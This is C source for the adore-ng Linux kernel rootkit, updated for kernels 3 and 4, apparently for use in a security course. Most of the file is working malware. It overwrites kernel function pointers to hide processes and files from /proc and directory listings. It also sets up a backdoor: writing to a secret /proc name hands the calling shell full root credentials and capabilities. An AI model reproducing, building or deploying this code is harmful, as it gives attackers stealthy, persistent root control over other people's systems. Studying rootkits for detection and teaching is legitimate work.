/*** (C) 2004 by Stealth
 ***
 *** http://spider.scorpions.net/~stealth
 *** http://stealth.7350.org/rootkits
 ***	
 ***
 *** (C)'ed Under a BSDish license. Please look at LICENSE-file.
 *** SO YOU USE THIS AT YOUR OWN RISK!
 *** YOU ARE ONLY ALLOWED TO USE THIS IN LEGAL MANNERS. 
 *** !!! FOR EDUCATIONAL PURPOSES ONLY !!!
 ***
 ***	-> Use ava to get all the things workin'.
 ***
 ***/

/**
  Reduced some functionality and updated for more modern kernels
 @Author Lok Yan
 @Date 15 JUL 2013

  Updated to support Kernel Version 4
 @Date 27 APR 2016
**/

//LOK: add in the version checker
#include <linux/version.h>
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,0,0) && LINUX_VERSION_CODE < KERNEL_VERSION(5,0,0)
#define KERNEL_VERSION_4
#elif LINUX_VERSION_CODE >= KERNEL_VERSION(3,0,0)
#define KERNEL_VERSION_3
#elif LINUX_VERSION_CODE >= KERNEL_VERSION(2,6,18)
#define KERNEL_VERSION_2_6_18
#else
#error "Unsupported Kernel Version"
#endif

//LOK: Apparently, the kernel changed over to a new filldir_t type in kernel version 3.19 - BLAH to the new changes - interesting that 2.4.18 was another major change

#if LINUX_VERSION_CODE >= KERNEL_VERSION(3,19,0)
#define FILLDIR_T_DIR_CONTEXT
#endif

//LOK: Apparently, readdir inside file_operations was removed from 3.11 on.
// It was replaced by iterate_dir which uses a dir_context (see the note above)
// to hold the filldir pointer called "actor" What fun
#if LINUX_VERSION_CODE >= KERNEL_VERSION(3,11,0)
#define USE_ITERATE_DIR
#endif

//LOK: In kernel 3.6 they started to use a lookup with unsigned int as the last param
// instead of a nameidata
#if LINUX_VERSION_CODE >= KERNEL_VERSION(3,6,0)
#define LOOKUP_WITH_UNSIGNED_INT
#endif

#ifdef MODVERSIONS
#include <linux/modversions.h>
#endif

#include <linux/types.h>
#include <linux/sched.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/string.h>
#include <linux/fs.h>
#include <linux/file.h>
#include <linux/mount.h>
#include <linux/proc_fs.h>
#include <linux/capability.h>
#include <linux/spinlock.h>
#include <linux/pid.h>
#include <linux/init.h>
#include <linux/seq_file.h>
#include <linux/kallsyms.h>

#include "adore.h"
#include "offsets.h"

//LOK: Removed the ability to pass in these values into
// The module
char *proc_fs = "/proc";	/* default proc FS to hide processes */
char *root_fs = "/";		/* default FS to hide files */
char *opt_fs = NULL;

//LOK: Added functions to set certain pages as read and writable
// This is needed for hooking
int set_addr_rw(unsigned long addr)
{
  unsigned int level; 
  pte_t* pte = lookup_address(addr, &level);
  if (pte == NULL)
  {
    return (-1);
  }

  pte->pte |= _PAGE_RW;

  return (0);
}

//Sets the page back to ro
int set_addr_ro(unsigned long addr)
{
  unsigned int level; 
  pte_t* pte = lookup_address(addr, &level);
  if (pte == NULL)
  {
    return (-1);
  }

  pte->pte = pte->pte & ~_PAGE_RW;

  return (0);
}


#ifdef USE_ITERATE_DIR
typedef int (*readdir_t)(struct file*, struct dir_context*);
#else
typedef int (*readdir_t)(struct file *, void *, filldir_t);
#endif

readdir_t orig_root_readdir=NULL;
readdir_t orig_opt_readdir=NULL;
readdir_t orig_proc_readdir=NULL;


//LOK: In kernel 3.6, they started to use a different prototype for lookup
#ifdef LOOKUP_WITH_UNSIGNED_INT
struct dentry *(*orig_proc_lookup)(struct inode *, struct dentry *,
                                   unsigned int) = NULL;
#else
struct dentry *(*orig_proc_lookup)(struct inode *, struct dentry *,
                                   struct nameidata *) = NULL;
#endif

static void adore_cleanup(void);


#ifndef PID_MAX
#define PID_MAX 0x8000
#endif

static char hidden_procs[PID_MAX/8+1];

inline void hide_proc(pid_t x)
{
  if (x >= PID_MAX || x == 1)
  {
    return;
  }
  hidden_procs[x/8] |= 1<<(x%8);
}

inline void unhide_proc(pid_t x)
{
  if (x >= PID_MAX)
  {
    return;
  }
  hidden_procs[x/8] &= ~(1<<(x%8));
}

inline char is_invisible(pid_t x)
{
  if (x >= PID_MAX)
  {
    return (0);
  }
  return hidden_procs[x/8]&(1<<(x%8));
}

/* Theres some crap after the PID-filename on proc
 * getdents() so the semantics of this function changed:
 * Make "672" -> 672 and
 * "672|@\"   -> 672 too
 */
int adore_atoi(const char* str)
{
  int ret = 0, mul = 1;
  const char *ptr;
   
  for (ptr = str; *ptr >= '0' && *ptr <= '9'; ptr++) 
  {
  }
  ptr--;
  while (ptr >= str) 
  {
    if (*ptr < '0' || *ptr > '9')
    {
      break;
    }
    ret += (*ptr - '0') * mul;
    mul *= 10;
    ptr--;
  }

  return (ret);
}

/* Own implementation of find_task_by_pid() */

static rwlock_t* ptasklistlock = NULL;

struct task_struct* adore_find_task(pid_t pid)
{
//LOK: We can't use tasklist_lock anymore since it is no longer
// exported started from 2.6.18
//I guess we will have to hack it again
//seed@ubuntu:~/Downloads/adore$ sudo grep tasklist_lock /proc/kallsyms 
//c1731980 D tasklist_lock

//we need the locks!
  struct task_struct* p = NULL;

  if (ptasklistlock == NULL)
  {
    return (NULL);
  }

  read_lock(ptasklistlock);	
#if defined(KERNEL_VERSION_3) || defined(KERNEL_VERSION_2_6_18) || defined(KERNEL_VERSION_4)
  for_each_process(p) //they changed the name - arg
  {
#else
  for_each_task(p)
  {
#endif
    if (p->pid == pid) 
    {
      read_unlock(ptasklistlock);
      return p;
    }
  }
  read_unlock(ptasklistlock);
  return (NULL);
}

int should_be_hidden(pid_t pid)
{
  struct task_struct *p = NULL;

  if (is_invisible(pid)) 
  {
    return 1;
  }

  p = adore_find_task(pid);
  if (!p)
  {
    return 0;
  }

  /* If the parent is hidden, we are hidden too XXX */
  task_lock(p);

  if (p->parent && is_invisible(p->parent->pid)) 
  {
    task_unlock(p);
    hide_proc(pid);
    return 1;
  }

  task_unlock(p);
  return 0;
}

/* You can control adore-ng without ava too:
 *
 * echo > /proc/<ADORE_KEY> will make the shell authenticated,
 * echo > /proc/<ADORE_KEY>-fullprivs will give UID 0,
 * cat /proc/hide-<PID> from such a shell will hide PID,
 * cat /proc/unhide-<PID> will unhide the process
 */
#ifdef LOOKUP_WITH_UNSIGNED_INT
struct dentry* adore_lookup(struct inode* i, struct dentry* d, unsigned int nd)
#else
struct dentry *adore_lookup(struct inode *i, struct dentry *d,
                            struct nameidata *nd)
#endif
{
  struct cred* new_cred = NULL;

  //kernel 4 uses a kuid struct now so we need to update it
/* Used for debugging only
#ifdef KERNEL_VERSION_4
  int olduid = current->cred->uid.val;
#else
  int olduid = current->cred->uid;
#endif
*/
  task_lock(current);

  if (strncmp(ADORE_KEY, d->d_iname, strlen(ADORE_KEY)) == 0) 
  {
    //LOK: This used to be a magic value that then makes it possible
    // for the current process to submit commands - its a
    // secret based authentication basically - I simply
    // disabled this for now. Will have to add it back later
    //printk(KERN_INFO "LOOKUP [%s]\n", d->d_iname);  
    current->flags |= PF_AUTH;
    //I don't know why suid is set to ADORE_VERSION so ohh well
    //current->cred->suid = ADORE_VERSION;
  } 
  else if ((current->flags & PF_AUTH) &&
            strncmp(d->d_iname, "fullprivs", 9) == 0) 
  {
    //printk(KERN_INFO "LOOKUP2 [%s]\n", d->d_iname);  
    //LOK: Using the new cred interface
    new_cred = prepare_creds();
    if (new_cred == NULL)
    {
      //maybe we should do something else?
      task_unlock(current);
      return (orig_proc_lookup(i, d, nd));
    }
#ifdef KERNEL_VERSION_4
    new_cred->uid = GLOBAL_ROOT_UID;
    new_cred->suid = GLOBAL_ROOT_UID;
    new_cred->euid = GLOBAL_ROOT_UID;
    new_cred->gid = GLOBAL_ROOT_GID;
    new_cred->egid = GLOBAL_ROOT_GID;
    new_cred->fsuid = GLOBAL_ROOT_UID;
    new_cred->fsgid = GLOBAL_ROOT_GID;
#else
    new_cred->uid = 0;
    new_cred->suid = 0;
    new_cred->euid = 0;
    new_cred->gid = 0;
    new_cred->egid = 0;
    new_cred->fsuid = 0;
    new_cred->fsgid = 0;
#endif
    new_cred->cap_effective = CAP_FULL_SET;
    new_cred->cap_permitted = CAP_FULL_SET;
    new_cred->cap_inheritable = CAP_FULL_SET;

    commit_creds(new_cred);

  } 
  else if ((current->flags & PF_AUTH) &&
            strncmp(d->d_iname, "hide-", 5) == 0) 
  {
    //printk(KERN_INFO "LOOKUP3 [%s]\n", d->d_iname);  
    hide_proc(adore_atoi(d->d_iname+5));
  } 
  else if ((current->flags & PF_AUTH) &&
            strncmp(d->d_iname, "unhide-", 7) == 0) 
  {
    //printk(KERN_INFO "LOOKUP4 [%s]\n", d->d_iname);  
    unhide_proc(adore_atoi(d->d_iname+7));
  } 
  else if ((current->flags & PF_AUTH) &&
            strncmp(d->d_iname, "uninstall", 9) == 0) 
  {
    //printk(KERN_INFO "LOOKUP5 [%s]\n", d->d_iname);  
    cleanup_module();
  }

  task_unlock(current);

  //if (new_cred)
  //printk(KERN_INFO "CRED = %d->%d\n", olduid, current->cred->uid);

  if ( should_be_hidden(adore_atoi(d->d_iname)) &&
     /* A hidden ps must be able to see itself! */
       !should_be_hidden(current->pid) )
  {
    return NULL;
  }

  return (orig_proc_lookup(i, d, nd));
}


filldir_t proc_filldir = NULL;
#ifdef FILLDIR_T_DIR_CONTEXT
struct dir_context* proc_ctx = NULL;
#endif

//LOK: In kernel version 3.0 SPIN_LOCK_UNLOCKED has been replaced by
// __SPIN_LOCK_UNLOCKED(x) where x is the name of the variable
//There is also a new macro called DEFINE_SPINLOCK(x) which does
// this for you. This is defined in spinlock_types.h
//Basically, we add in the little version check
//Applies to Kernel version 4.0 as well
#if defined(KERNEL_VERSION_3) || defined(KERNEL_VERSION_4)
DEFINE_SPINLOCK(proc_filldir_lock);
#else
spinlock_t proc_filldir_lock = SPIN_LOCK_UNLOCKED;
#endif

#ifdef FILLDIR_T_DIR_CONTEXT
int adore_proc_filldir(struct dir_context* ctx, const char* name, int nlen, loff_t off, u64 ino, unsigned x)
#else
int adore_proc_filldir(void *buf, const char *name, int nlen, loff_t off, u64 ino, unsigned x)
#endif
{

#ifdef FILLDIR_T_DIR_CONTEXT
  int ret = 0;
#endif

  if (should_be_hidden(adore_atoi(name)))
  {
    return (0);
  }

#ifdef FILLDIR_T_DIR_CONTEXT
  //update the value of ctx->pos because the original readdir might have changed it
  proc_ctx->pos = ctx->pos;
  ret = proc_filldir(proc_ctx, name, nlen, off, ino, x);
  ctx->pos = proc_ctx->pos;
  return (ret);
#else
  return proc_filldir(buf, name, nlen, off, ino, x);
#endif
}


#ifdef USE_ITERATE_DIR
int adore_proc_readdir(struct file* fp, struct dir_context* ctx)
{
  int r = 0;
  struct dir_context tempCtx = { &adore_proc_filldir, ctx->pos };

  //should I check this???? I don't think I need to
  //guess I can't check this because of the initialization for tempCtx
  /*
  if (!ctx)
  {
    return (-1);
  }
  */

  spin_lock(&proc_filldir_lock);
  proc_filldir = ctx->actor;
  proc_ctx = ctx;
  r = orig_proc_readdir(fp, &tempCtx);
  spin_unlock(&proc_filldir_lock);
  

  //after we are done, we need to update the pos value
  ctx->pos = tempCtx.pos;
  return (r);
}
#else
int adore_proc_readdir(struct file *fp, void *buf, filldir_t filldir)
{
  int r = 0;

  spin_lock(&proc_filldir_lock);
  proc_filldir = filldir;
  r = orig_proc_readdir(fp, buf, adore_proc_filldir);
  spin_unlock(&proc_filldir_lock);
  return (r);
}
#endif

filldir_t opt_filldir = NULL;
struct super_block *opt_sb[1024];

#ifdef FILLDIR_T_DIR_CONTEXT
int adore_opt_filldir(struct dir_context* ctx, const char *name, int nlen, loff_t off, u64 ino, unsigned x)
#else
int adore_opt_filldir(void *buf, const char *name, int nlen, loff_t off, u64 ino, unsigned x)
#endif
{
  struct inode *inode = NULL;
  int r = 0;
  uid_t uid;
  gid_t gid;

  if ((inode = iget_locked(opt_sb[current->pid % 1024], ino)) == NULL)
  {
    return 0;
  }
#ifdef KERNEL_VERSION_4
  uid = inode->i_uid.val;
  gid = inode->i_gid.val;
#else
  uid = inode->i_uid;
  gid = inode->i_gid;
#endif
  iput(inode);

  /* Is it hidden ? */
  if (uid == ELITE_UID && gid == ELITE_GID) 
  {
    r = 0;
  } 
  else
  {
#ifdef FILLDIR_T_DIR_CONTEXT
    struct dir_context tempCtx = {opt_filldir, ctx->pos};
    r = opt_filldir(&tempCtx, name, nlen, off, ino, x);
    ctx->pos = tempCtx.pos;
#else
    r = opt_filldir(buf, name, nlen, off, ino, x);
#endif
  }

  return (r);
}

#ifdef USE_ITERATE_DIR
int adore_opt_readdir(struct file* fp, struct dir_context* ctx)
{
  int r = 0;
  struct dir_context tempCtx = { adore_proc_filldir, ctx->pos };

  //do a similar thing as in adore_proc_readdir
  if (!fp || !fp->f_path.mnt)
  {
    return (0);
  }

  //LOK: I wonder why we don't use a lock for this one....?
  opt_filldir = ctx->actor;
  opt_sb[current->pid % 1024] = fp->f_path.mnt->mnt_sb;

  r = orig_opt_readdir(fp, &tempCtx);
	
  //after we are done, we need to update the pos value
  ctx->pos = tempCtx.pos;
  return r;
}
#else

int adore_opt_readdir(struct file *fp, void *buf, filldir_t filldir)
{
  int r = 0;

  //LOK: It appears that f_vfsmnt is actually an alias to f_path.mnt starting
  // in kernel version 3. Also the alias was removed in 3.9, so lets change this

#if defined(KERNEL_VERSION_3) || defined(KERNEL_VERSION_4)
  if (!fp || !fp->f_path.mnt)
#else
  if (!fp || !fp->f_vfsmnt)
#endif
  {
    return 0;
  }

  opt_filldir = filldir;
#if defined(KERNEL_VERSION_3) || defined(KERNEL_VERSION_4)
  opt_sb[current->pid % 1024] = fp->f_path.mnt->mnt_sb;
#else
  opt_sb[current->pid % 1024] = fp->f_vfsmnt->mnt_sb;
#endif
  r = orig_opt_readdir(fp, buf, adore_opt_filldir);
	
  return r;
}
#endif



/* About the locking of these global vars:
 * I used to lock these via rwlocks but on SMP systems this can cause
 * a deadlock because the iget() locks an inode itself and I guess this
 * could cause a locking situation of AB BA. So, I do not lock root_sb and
 * root_filldir (same with opt_) anymore. root_filldir should anyway always
 * be the same (filldir64 or filldir, depending on the libc). The worst thing that
 * could happen is that 2 processes call filldir where the 2nd is replacing
 * root_sb which affects the 1st process which AT WORST CASE shows the hidden files.
 * Following conditions have to be met then: 1. SMP 2. 2 processes calling getdents()
 * on 2 different partitions with the same FS.
 * Now, since I made an array of super_blocks it must also be that the PIDs of
 * these procs have to be the same PID modulo 1024. This sitation (all 3 cases must
 * be met) should be very very rare.
 */
filldir_t root_filldir = NULL;
struct super_block *root_sb[1024];

#ifdef FILLDIR_T_DIR_CONTEXT
struct dir_context* root_ctx = NULL;
int adore_root_filldir(struct dir_context* ctx, const char *name, int nlen, loff_t off, u64 ino, unsigned x)
#else
int adore_root_filldir(void *buf, const char *name, int nlen, loff_t off, u64 ino, unsigned x)
#endif
{
  struct inode *inode = NULL;
  int r = 0;
  uid_t uid = -1; //these are both invalid UIDs
  gid_t gid = -1;

  if ((inode = iget_locked(root_sb[current->pid % 1024], ino)) == NULL)
  {
    return 0;
  }

  if (inode->i_state & I_NEW)
  {
    unlock_new_inode(inode);
  }
  else
  {
#ifdef KERNEL_VERSION_4
    uid = inode->i_uid.val;
    gid = inode->i_gid.val;
#else
    uid = inode->i_uid;
    gid = inode->i_gid;
#endif
  }
  iput(inode);

  /* Is it hidden ? */
  if (uid == ELITE_UID && gid == ELITE_GID) 
  {
    r = 0;
  }
  else
  {
#ifdef FILLDIR_T_DIR_CONTEXT
    root_ctx->pos = ctx->pos;
    r = root_filldir(root_ctx, name, nlen, off, ino, x);
    ctx->pos = root_ctx->pos;
#else
    r = root_filldir(buf, name, nlen, off, ino, x);
#endif
  }

  return r;
}


#ifdef USE_ITERATE_DIR
int adore_root_readdir(struct file* fp, struct dir_context* ctx)
{
  int r = 0;
  struct dir_context tempCtx = {adore_root_filldir, ctx->pos};
  if (!fp || !fp->f_path.mnt)
  {
    return (0);
  }

  root_filldir = ctx->actor;
  root_ctx = ctx;
  root_sb[current->pid % 1024] = fp->f_path.mnt->mnt_sb;
  r = orig_root_readdir(fp, &tempCtx);
  
  ctx->pos = tempCtx.pos;
  return (r);
}

#else
int adore_root_readdir(struct file *fp, void *buf, filldir_t filldir)
{
  int r = 0;

#if defined(KERNEL_VERSION_3) || defined(KERNEL_VERSION_4)
  if (!fp || !fp->f_path.mnt)
#else
  if (!fp || !fp->f_vfsmnt)
#endif
  {
    return 0;
  }

  root_filldir = filldir;
#if defined(KERNEL_VERSION_3) || defined(KERNEL_VERSION_4)
  root_sb[current->pid % 1024] = fp->f_path.mnt->mnt_sb;
#else
  root_sb[current->pid % 1024] = fp->f_vfsmnt->mnt_sb;
#endif
  r = orig_root_readdir(fp, buf, adore_root_filldir);
	
  return r;
}
#endif

int patch_vfs(const char *p, readdir_t *orig_readdir, readdir_t new_readdir)
{
  struct file *filep;
  struct file_operations* fop = NULL;
	
  if ((filep = filp_open(p, O_RDONLY, 0)) == NULL) 
  {
    return -1;
  }

  fop = (struct file_operations*)filep->f_op;
  set_addr_rw((unsigned long)fop);

  if (orig_readdir)
#ifdef USE_ITERATE_DIR
  {
    *orig_readdir = fop->iterate;
  }
  fop->iterate = new_readdir;
#else
  {
    *orig_readdir = fop->readdir;
  }
  fop->readdir = new_readdir;
#endif

  set_addr_ro((unsigned long)fop);
  filp_close(filep, 0);
  return 0;
}


int unpatch_vfs(const char *p, readdir_t orig_readdir)
{
  struct file *filep;
  struct file_operations* fop = NULL;

  if ((filep = filp_open(p, O_RDONLY, 0)) == NULL) 
  {
    return -1;
  }

  fop = (struct file_operations*)filep->f_op;
  set_addr_rw((unsigned long)fop);

#ifdef USE_ITERATE_DIR
  fop->iterate = orig_readdir;
#else
  fop->readdir = orig_readdir;
#endif
  set_addr_ro((unsigned long)fop);
  filp_close(filep, 0);
  return 0;
}


char *strnstr(const char *haystack, const char *needle, size_t n)
{
  char *s = strstr(haystack, needle);
  if (s == NULL)
  {
    return NULL;
  }
  if (s-haystack+strlen(needle) <= n)
  {
    return s;
  }
  else
  {
    return NULL;
  }
}

static struct inode_operations* proc_root_inode_ops = NULL;

static int __init adore_init(void)
{
  memset(hidden_procs, 0, sizeof(hidden_procs));

  proc_root_inode_ops = (struct inode_operations*)kallsyms_lookup_name("proc_root_inode_operations");
  if (proc_root_inode_ops == NULL)
  {
    proc_root_inode_ops = (struct inode_operations*)PROC_ROOT_INODE_OPERATIONS_ADDR;
  }

  if (proc_root_inode_ops == NULL)
  {
    printk(KERN_INFO "Could not find proc_root_inode_ops -- did you run configure?\n");
    return (-1);
  }

  ptasklistlock = (rwlock_t*) kallsyms_lookup_name("tasklist_lock");
  if (ptasklistlock == NULL)
  {
    ptasklistlock = (rwlock_t*)(TASKLIST_LOCK_ADDR);
  }
 
  if (ptasklistlock == NULL)
  {
    printk(KERN_INFO "Could not find tasklist_lock -- did you run configure?\n");
    return (-1);
  }

  //save the original value
  orig_proc_lookup = proc_root_inode_ops->lookup;
  //make the memory page writable
  set_addr_rw((unsigned long)proc_root_inode_ops);
  //make the change 
  proc_root_inode_ops->lookup = adore_lookup;
  //reset the memory page
  set_addr_ro((unsigned long)proc_root_inode_ops);

  patch_vfs(proc_fs, &orig_proc_readdir, adore_proc_readdir);
  patch_vfs(root_fs, &orig_root_readdir, adore_root_readdir);
  /*
  if (opt_fs)
  {
    patch_vfs(opt_fs, &orig_opt_readdir, adore_opt_readdir);\
  }
  */
  printk(KERN_INFO "Set\n");
  return 0;
}


static void __exit adore_cleanup()
{
  //struct proc_dir_entry *pde = NULL;
  //struct tcp_seq_afinfo *t_afinfo = NULL;
  //int i = 0, j = 0;
  static int cleaned = 0;

  if (cleaned)
  {
    return;
  }
  
  //restore the original value to lookup
  set_addr_rw((unsigned long)proc_root_inode_ops);
  proc_root_inode_ops->lookup = orig_proc_lookup;
  set_addr_ro((unsigned long)proc_root_inode_ops);

  unpatch_vfs(proc_fs, orig_proc_readdir);
  unpatch_vfs(root_fs, orig_root_readdir);

  /*
  if (orig_opt_readdir)
  {
    unpatch_vfs(opt_fs, orig_opt_readdir);
  }
  */
  cleaned = 1;
  printk(KERN_INFO "Restored\n");
}

module_init(adore_init);
module_exit(adore_cleanup);

MODULE_LICENSE("GPL");

